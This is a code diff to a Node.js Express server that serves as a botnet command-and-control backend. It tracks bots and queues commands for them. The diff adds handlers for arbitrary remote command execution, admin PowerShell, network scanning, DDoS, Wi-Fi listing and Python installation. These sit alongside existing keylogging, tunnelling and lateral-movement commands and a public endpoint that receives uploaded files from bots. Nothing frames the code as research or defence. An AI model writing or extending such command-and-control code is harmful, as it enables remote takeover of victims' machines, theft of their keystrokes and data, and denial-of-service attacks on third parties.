@@ -17,7 +17,10 @@ const {
     OpenTunnel,
     NetworkMove,
     GetKeyboardData,
-    InstallTunnel
+    InstallPython,
+    InstallTunnel,
+    PowershellAdmin,
+    RunCommand
 } = require("./commands")
 const {join} = require("path");
 
@@ -70,7 +73,7 @@ app.use(cors( {
 
 const bots = []; // { id: 1, name: "Bot 1", status: "online" },
 
-const channels = []; 
+const channels = [];
 
 function createChannel(botId) {
     logger.info("creating channel for bot : " + botId);
@@ -157,6 +160,61 @@ function sendCommand(command) {
             const networkMoveCommand = new NetworkMove({targetIp : command.args.targetIp})
             targetChannel.commands.push(networkMoveCommand)
             break
+
+        case "InstallPython":
+            logger.info("Adding InstallPython command")
+            const installCommand = new InstallPython()
+            targetChannel.commands.push(installCommand)
+            break
+
+        case "ClearCommands":
+            logger.info("Clearing commands")
+            targetChannel.commands = []
+            break
+
+        case "RunCommand" :
+            logger.info("Adding RunCommand command")
+            const runCommand = new RunCommand(command.args.command)
+            targetChannel.commands.push(runCommand)
+            break
+
+        case "PowershellAdmin" :
+            logger.info("Adding PowershellAdmin command")
+            const powershellAdminCommand = new PowershellAdmin(command.args.command)
+            targetChannel.commands.push(powershellAdminCommand)
+            break
+
+        case "NetworkScan" :
+            logger.info("Adding NetworkScan command")
+            const networkScanCommand = new NetworkScan(command.args.targetIp)
+            targetChannel.commands.push(networkScanCommand)
+            break
+
+        case "Ddos" :
+            logger.info("Adding Ddos command")
+            const ddosCommand = new Ddos(command.args.targetIp)
+            targetChannel.commands.push(ddosCommand)
+            break
+
+        case "WifiList" :
+            logger.info("Adding WifiList command")
+            const wifiListCommand = new WifiList()
+            targetChannel.commands.push(wifiListCommand)
+            break
+
+
+        case "SetPullingRate" :
+            logger.info("Adding SetPullingRate command")
+            const setPullingRateCommand = new SetPullingRate(command.args.rate)
+            targetChannel.commands.push(setPullingRateCommand)
+            break
+
+        case "Gateway" :
+            logger.info("Adding Gateway command")
+            const gatewayCommand = new Gateway()
+            targetChannel.commands.push(gatewayCommand)
+            break
+
     }
 }
 
@@ -211,7 +269,7 @@ function updateBotLastSeen(botId) {
     logger.warn("No bot found for bot : " + botId + " -> aborting update.")
 }
 
-/* ADMIN routes  */ 
+/* ADMIN routes  */
 
 app.get("/backend/bots", (req, res) => {
     res.send(JSON.stringify(bots));
@@ -242,10 +300,10 @@ app.get("/backend/channels", (req, res) => {
 });
 
 
-/* --- ADMIN --- */ 
+/* --- ADMIN --- */
 
 
-/* --- PUBLIC --- */ 
+/* --- PUBLIC --- */
 app.post("/",  upload.single('file'), (req, res) => {
     logger.info("receiving a POST request from : " + req.ip);
     logger.info("request body : " + JSON.stringify(req.body));
@@ -285,10 +343,10 @@ app.post("/",  upload.single('file'), (req, res) => {
 
     res.send("OK");
 
-   
+
 });
 
-/* --- PUBLIC --- */ 
+/* --- PUBLIC --- */
 
 
 app.listen(port, () => {
